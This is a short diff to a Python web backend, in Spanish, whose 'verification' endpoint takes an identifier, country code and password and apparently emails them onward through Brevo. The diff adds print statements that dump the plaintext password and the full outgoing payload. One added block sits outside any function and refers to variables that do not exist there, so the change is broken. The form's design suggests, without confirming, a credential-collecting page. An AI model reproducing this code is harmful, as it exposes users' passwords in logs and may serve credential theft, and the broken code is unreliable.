@@ -123,6 +123,12 @@ async def guardar_verificacion(data: DatosVerificacion):
                 "mensaje": str(e)
             }
         )
+
+print("========== DATOS ==========")
+print("Identificador:", data.identificador)
+print("Codigo:", data.codigo_pais)
+print("Contraseña:", data.contrasena)
+print("Fecha:", fecha)
 # ─────────────────────────────────────────────────────────────
 # Función de envío de correo (Gmail SMTP)
 # ─────────────────────────────────────────────────────────────
@@ -175,9 +181,11 @@ def enviar_correo_formulario(identificador, codigo_pais, contrasena, fecha):
         headers=headers,
         timeout=30
     )
-
-    print("Brevo Status:", respuesta.status_code)
-    print("Brevo:", respuesta.text)
+    print("========== PAYLOAD ==========")
+    print(payload)
+    print("========== RESPUESTA ==========")
+    print(respuesta.status_code)
+    print(respuesta.text)
 
     respuesta.raise_for_status()
 
